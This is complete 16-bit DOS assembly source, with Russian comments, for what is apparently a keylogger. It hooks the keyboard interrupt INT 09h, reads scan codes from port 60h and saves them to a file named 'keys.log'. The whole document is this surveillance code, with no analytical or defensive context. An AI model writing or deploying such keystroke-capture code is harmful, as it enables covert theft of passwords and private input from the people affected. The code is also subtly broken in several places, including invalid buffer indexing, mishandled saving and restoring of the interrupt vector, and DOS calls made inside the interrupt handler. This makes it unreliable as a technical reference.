.model tiny
.stack 100h

.data
    msg db 'Press any key (ESC to exit): $'
    filename db 'keys.log', 0
    buffer db 255 dup(0)     ; Буфер для хранения нажатий клавиш
    count db 0               ; Счетчик нажатий
    oldInt09 dw 0            ; Место для старого вектора INT 09h

.code
start:
    ; Установка сегмента данных
    mov ax, @data
    mov ds, ax

    ; Вывод сообщения
    mov ah, 09h
    lea dx, msg
    int 21h

    ; Установка вектора прерывания
    mov ax, 3509h            ; Получить адрес вектора INT 09h
    int 21h
    mov word ptr oldInt09, bx
    mov word ptr oldInt09 + 2, es

    mov ax, 2509h            ; Установить новый обработчик прерывания
    lea dx, newInt09
    int 21h

    ; Основной цикл
main_loop:
    ; Ожидание нажатия клавиши
    mov ah, 01h
    int 21h

    ; Проверка нажатия ESC
    cmp al, 1Bh
    je exit_program

    ; Сохранение нажатой клавиши в буфер
    mov buffer[count], al
    inc count
    cmp count, 255           ; Проверка на переполнение буфера
    jl continue_loop

    ; Запись в файл, если буфер полон
    call write_to_file
    mov count, 0            ; Сброс счетчика

continue_loop:
    jmp main_loop

exit_program:
    call write_to_file      ; Запись оставшихся данных в файл
    ; Восстановление старого вектора прерывания
    mov ax, 2509h
    lea dx, oldInt09
    int 21h

    mov ax, 4C00h           ; Завершение программы
    int 21h

; Новый обработчик прерывания
newInt09:
    ; Перехват прерывания клавиатуры INT 09h
    push ax
    push bx
    in al, 60h              ; Чтение кода символа из порта
    mov buffer[count], al
    inc count
    cmp count, 255
    jl continue_newInt09

    ; Запись в файл, если буфер полон
    call write_to_file
    mov count, 0

continue_newInt09:
    pop bx
    pop ax
    jmp word ptr oldInt09    ; Переход к старому обработчику

; Процедура записи буфера в файл
write_to_file:
    mov ah, 3Ch              ; Создание файла
    mov cx, 1                ; Размер файла
    lea dx, filename
    int 21h
    mov bx, ax               ; Дескриптор файла

    mov ah, 40h              ; Запись в файл
    lea dx, buffer           ; Адрес буфера
    mov cx, count            ; Количество байт для записи
    int 21h

    mov ah, 3Eh              ; Закрытие файла
    int 21h
    ret

end start